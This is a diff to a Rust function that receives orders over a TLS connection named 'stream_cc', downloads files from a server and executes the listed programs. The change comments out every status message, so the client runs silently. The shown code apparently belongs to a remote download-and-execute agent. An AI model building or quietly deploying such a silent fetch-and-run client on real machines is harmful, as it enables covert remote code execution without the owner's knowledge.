@@ -9,7 +9,7 @@ use openssl::ssl::{SslStream, SslConnector};
 use std::net::SocketAddr;
 
 pub fn flow(stream_cc: SslStream<TcpStream>, ip_addr: String, fs_sock: SocketAddr, connector: SslConnector, number_while: u64) {
-    println!("Could connect to server!");
+    //println!("Could connect to server!");
 
     let order;
     if number_while == 0 {
@@ -30,7 +30,7 @@ pub fn flow(stream_cc: SslStream<TcpStream>, ip_addr: String, fs_sock: SocketAdd
     
             handle_connection_fs::handle_connection_fs(stream_fs, &string);
         } else {
-            println!("problem downloading file {} from server.", string);
+            //println!("problem downloading file {} from server.", string);
         }
 
     }
@@ -38,12 +38,12 @@ pub fn flow(stream_cc: SslStream<TcpStream>, ip_addr: String, fs_sock: SocketAdd
     for mut prog in list_contents_exec {
         let return_code = prog.exec();
         if return_code == 0 {
-            println!("Ok: {}: Execution complete.", prog.get_binscript());
+            //println!("Ok: {}: Execution complete.", prog.get_binscript());
         } else {
-            println!("Fail: {}: Error while executing the program.", prog.get_binscript());
+            //println!("Fail: {}: Error while executing the program.", prog.get_binscript());
         }
     }
 
-    println!("End of connection \n");
+    //println!("End of connection \n");
 
 }
